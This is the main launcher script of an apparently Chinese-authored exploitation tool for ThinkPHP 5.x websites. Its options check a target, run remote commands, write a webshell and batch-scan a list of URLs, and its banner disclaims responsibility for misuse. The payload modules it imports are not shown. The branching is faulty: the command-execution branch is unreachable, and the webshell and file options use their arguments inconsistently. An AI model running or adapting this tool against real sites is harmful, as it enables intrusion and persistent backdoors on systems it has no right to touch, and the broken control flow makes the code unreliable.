# -*- coding: utf-8 -*-


import re
import argparse
from urllib.parse import urlparse

from module.file import FILE
from module.check import Check
from module.exp import Exp
from module.shell import Shell

image = """
██╗ ██████╗███████╗██████╗ ███████╗██████╗  ██████╗       ███╗   ██╗
██║██╔════╝██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝       ████╗  ██║
██║██║     █████╗  ██████╔╝█████╗  ██████╔╝██║  ███╗█████╗██╔██╗ ██║
██║██║     ██╔══╝  ██╔══██╗██╔══╝  ██╔══██╗██║   ██║╚════╝██║╚██╗██║
██║╚██████╗███████╗██████╔╝███████╗██║  ██║╚██████╔╝      ██║ ╚████║          
            开发人员不承担任何责任,也不对任何滥用或者损坏负责
                                                
                                                --code-by  iceberg-N 
                                                
                                                
thinkphp5.x版本综合利用工具                    
如遇到exp或写shell失败,请手工尝试
                                             
                                                
                                                
《飘雪》---陈慧娴  ~~又见雪飘过~~飘于伤心记忆中~~让我再想起~~却掀起我心痛~~
                                                                         
"""

headers = {
        'Content-Type': "application/x-www-form-urlencoded",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'
    }



#参数解析
def argparser():
    parser = argparse.ArgumentParser(description='该工具集合thinkphp5.x所有版本的漏洞检测、利用、写shell于一体,如遇到exp或写shell失败,请手工尝试!')
    parser.add_argument('-u', help='目标url')
    parser.add_argument('-c', type=str, help="命令执行")
    parser.add_argument('-w', nargs='?', const=1, help="写入webshell")
    parser.add_argument('-f', help="读取文件")
    parser.add_argument('-o', default='./', help="输出文件")
    args = parser.parse_args()
    return args


# 解析url
class ParseUrl:

    def __init__(self):
        pass

    def parseurl(self, target):
        try:
            if re.match(r'https://', target) == None:
                url = urlparse(target)
                hostname = url.hostname
                if url.port == None:
                     return "http://" + hostname

                else:
                    return "http://" + hostname + ":" + str(url.port)

            else:
                return target
            # res = requests.get(target, headers=headers)
            # if res.status_code == 200:
            #     return target
            # elif res.status_code == 302 or res.status_code == 301:
            #     target = res.headers['location']
            #     url = urlparse(target)
            #     hostname = url.hostname
            #     port = url.port
            #     target = "http://" + hostname + ":" + str(port)
            #     return target
            # else:
            #     target = "https://" + hostname + ":" + str(port)
            #     res = requests.get(target, headers=headers)
            #     if res.status_code == 200:
            #         return target
            #     elif res.status_code == 302:
            #         pass

            # if re.match(r'.*\?', target):
            #     parse = re.findall(r'http.*?\?', target)
            #     parse = ''.join(parse).strip('?')
            #     return parse
            # else:
            #     return target
        except Exception as e:
            print("[-] url格式错误!")



if __name__ == "__main__":
    check = {}
    print(image)
    args = argparser()

    if args.u:
        target = args.u
        target_url = ParseUrl().parseurl(target)
        check = Check(target_url).exec()
        # check = {**check, **check}

    elif args.u and args.c:
        target = args.u
        target_url = ParseUrl().parseurl(target)
        check = Check(target_url).exec()
        cmd_code = args.c
        if check:
            cmd_result = Exp(target_url, check, cmd_code).check_exp()
        else:
            print("暂无可以用模块!")


    elif args.f and args.o:
        path = args.f
        output_path = args.o
        with open(path, 'r') as file:
            targets = file.readlines()
            for target in targets:
                target_url = ParseUrl().parseurl(target)
                check = Check(target_url).exec()
                FILE(target_url, check, output_path).file_load()
            file.close()
        print("扫描结果已输出到当前文件夹下!")


    elif args.w:
        target = args.w
        target_url = ParseUrl().parseurl(target)
        check = Check(target_url).exec()
        result = Shell(target_url, check).check_shell()
    else:
        print("请指定目标!")

